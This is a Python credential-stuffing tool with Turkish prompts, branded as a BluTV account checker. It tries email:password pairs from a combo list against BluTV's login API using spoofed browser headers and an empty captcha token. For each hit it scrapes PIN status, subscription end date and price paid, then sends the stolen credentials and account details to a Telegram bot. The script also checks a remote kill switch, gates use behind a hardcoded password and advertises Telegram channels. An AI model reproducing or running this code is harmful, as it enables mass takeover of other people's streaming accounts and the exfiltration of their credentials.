import requests
import re
import sys
import os
import time
from datetime import datetime
import webbrowser

import os
import time





import requests
import sys

def fetch_tool_status():
    try:
        response = requests.get('https://rooxtool.freewebhostmost.com/tool_status.php?action=getAll')
        response.raise_for_status()
        tools = response.json()
        return tools
    except requests.exceptions.HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
        return None
    except Exception as err:
        print(f'Other error occurred: {err}')
        return None

def main():
    tools = fetch_tool_status()
    if tools:
        # Örneğin, 3. toolu kontrol etmek için:
        tool_index = 6  # 3. tool için index 2

        if len(tools) > tool_index:
            specific_tool = tools[tool_index]
            print(f'{tool_index + 1}. {specific_tool["name"]} Tool Durumu: {specific_tool["status"]}')
            if 'aktif' in specific_tool["status"].lower():
                print(f"{specific_tool['name']} toolu açık, iyisin!")
            elif 'kapalı' in specific_tool["status"].lower() or 'pasif' in specific_tool["status"].lower():
                print("finished")
                sys.exit()
            else:
                print(f"Geçersiz durum. {specific_tool['name']} tool durumu kontrol ediliyor.")
        else:
            print(f'Tool index {tool_index} geçerli değil. Toplam {len(tools)} tool var.')
    else:
        print('Tool durumları alınamadı.')

if __name__ == '__main__':
    main()




def get_user_input(prompt):
    return input(prompt)

def calculate_remaining_days(end_date):
    end_date = datetime.strptime(end_date, '%Y-%m-%d')
    today = datetime.now()
    remaining_days = (end_date - today).days
    return remaining_days

def login_blutv(email, password):
    login_url = 'https://www.blutv.com/api/login'
    data = {
        'username': email,
        'password': password,
        'remember': True,
        'captchaVersion': 'v3',
        'captchaToken': ''
    }
    headers = {
        'Content-Type': 'text/plain;charset=UTF-8',
        'Origin': 'https://www.blutv.com',
        'Referer': 'https://www.blutv.com/giris',
        'Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
    }
    session = requests.Session()
    response = session.post(login_url, json=data, headers=headers)
    return session, response

def fetch_profile_info(session):
    profile_url = 'https://www.blutv.com/profil'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'TE': 'trailers'
    }
    profile_response = session.get(profile_url, headers=headers)
    return profile_response.text

def parse_profile_info(profile_text):
    capture_text = ""
    
    pin_matches = re.findall(r'"hasPin":(.*?),', profile_text)
    if pin_matches:
        pin_statuses = [
            "VAR🔒" if match == "true" else "YOK❌" for match in pin_matches
        ]
        pin_status_text = " - ".join(
            f'PİN {i}: {status}'
            for i, status in enumerate(pin_statuses, start=1))
        capture_text += f'{pin_status_text} | '

    if '"state":"CANCELLED"' in profile_text:
        capture_text += 'Hesap iptal edilmiş 🔴 | '
    elif '"state":"SUSPEND"' in profile_text:
        capture_text += ' | '

    subscription_matches = re.findall(r'"end_date":"(.*?)T', profile_text)
    if subscription_matches:
        for match in subscription_matches:
            remaining_days = calculate_remaining_days(match)
            capture_text += f'Abonelik bitiş zamanı=> : {match} | Kalan gün : {remaining_days} | '

    price_matches = re.findall(r'"price":(.*?),', profile_text)
    if price_matches:
        last_price = price_matches[-1]
        capture_text += f'Ödenen fiyat=> {last_price} |KANAL=> t.me/valentiaarsvv'
    
    return capture_text

def send_to_telegram(bot_token, chat_id, message):
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
    requests.get(api_url)

def blutv_checker(bot_token, chat_id, combo_path):
    with open(combo_path, 'r') as file:
        combos = file.readlines()

    for combo in combos:
        email, password = combo.strip().split(':')
        session, response = login_blutv(email, password)
        
        if response.status_code == 200:
            capture_text = f'☑️ BAŞARILI GİRİŞ\nEmail=> {email}\nŞifre=> {password}\n'
            profile_text = fetch_profile_info(session)
            profile_info = parse_profile_info(profile_text)
            capture_text += profile_info
            
            send_to_telegram(bot_token, chat_id, capture_text)
            print(capture_text)
        else:
            print(f'\x1b[1;32m Başarısız giriş ❌: {email}:{password}')

if __name__ == "__main__":
    nower = """
    \033[96m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
              ____    _        _    _   _______  __      __
              |  _ \  | |      | |  | | |__   __| \ \    / /
              | |_) | | |      | |  | |    | |     \ \  / /
              |  _ <  | |      | |  | |    | |      \ \/ /
              | |_) | | |____  | |__| |    | |       \  /
              |____/  |______|  \____/     |_|        \/
                 < BLU-TV CHECKER TOOL VIP >
                 < TELEGRAM @Roox_00 t.me/valentiaarsivv >                               
    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
    \033[0m
    """
    print(nower)

    sifre = 'ValentiaTool'
    pss = get_user_input('\x1b[1;32m TOOL ŞİFRESİ: ')
    if pss != sifre:
        sys.exit('\x1b[1;32mYANLIŞ ŞİFRE TELE=> @Roox_00 ')

    print('\x1b[1;92mDOĞRU ŞİFRE BAŞARIYLA YÖNLENDİRİLİYORSUNUZ✓ ')
    time.sleep(2)
    os.system('clear')

    bot_token = get_user_input("\x1b[1;91mToken Girin Yawşak: ")
    chat_id = get_user_input("\x1b[1;32mID Gir Piç: ")
    combo_path = get_user_input("\x1b[1;34mCombo Yolu Girin oç: ")

    blutv_checker(bot_token, chat_id, combo_path)
